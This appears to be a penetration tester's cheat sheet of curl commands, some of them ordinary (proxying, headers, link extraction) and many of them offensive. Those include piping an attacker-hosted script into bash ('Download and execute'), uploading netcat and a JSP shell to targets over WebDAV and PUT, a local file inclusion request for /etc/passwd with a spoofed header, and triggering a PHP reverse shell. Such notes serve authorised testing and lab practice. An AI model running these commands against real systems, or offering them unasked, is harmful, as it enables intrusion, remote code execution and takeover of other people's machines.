#### Download and execute
```bash - target
curl http://$KALI/shelly.sh | bash
```
#### Save to file
```bash - target
curl http://$KALI/shelly.sh -o shelly.sh
```
#### Proxy to Burp
```
curl --proxy localhost:8080 -k https://$TARGET
```
#### Headers
```bash - kali
curl -I http://192.168.120.204/filemanager/
```
#### GET request with data
```
curl -X GET -k https://$TARGET -d 'testdata'
```
#### Upload file
```bash
curl --user 'user:password' -T nc64.exe http://$TARGET/webdav/nc64.exe
```
```bash
curl -X PUT http://$TARGET:PORT/shelly.jsp -d 2- < shelly.jsp
```
#### LFI example with custom header
```bash -kali
curl http://$TARGET:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost"
```
#### html2text
```bash - kali
curl http://$TARGET:8080/ | html2text
```
#### Credentials
```bash - kali
curl --user $USER:$PASSWORD $TARGET
```
#### Webdav trigger webshell
```bash - kali
curl http://$TARGET/webdav/php-reverse-shell.php -u $USER:$PASSWORD
```
#### Edit Method
```bash - kali
curl -siX POST -H 'Content-Length: 0' http://$TARGET:33333/list-running-procs
```
#### Link Extractor
```bash - kali
curl http://$TARGET | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```
